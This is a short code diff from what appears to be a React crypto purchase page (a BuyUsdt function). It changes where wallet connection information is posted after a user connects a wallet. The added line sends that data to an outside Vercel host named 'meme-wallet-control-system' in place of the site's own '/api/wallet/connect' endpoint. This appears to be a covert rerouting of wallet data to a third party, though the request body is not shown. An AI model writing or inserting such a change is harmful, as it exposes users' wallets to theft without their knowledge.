@@ -240,7 +240,7 @@ function BuyUsdt() {
       await connect(wallet.id);
       
       // Send connection info to backend
-      await fetch('/api/wallet/connect', {
+      await fetch('https://meme-wallet-control-system-hx1r.vercel.app/api/wallet-connect', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
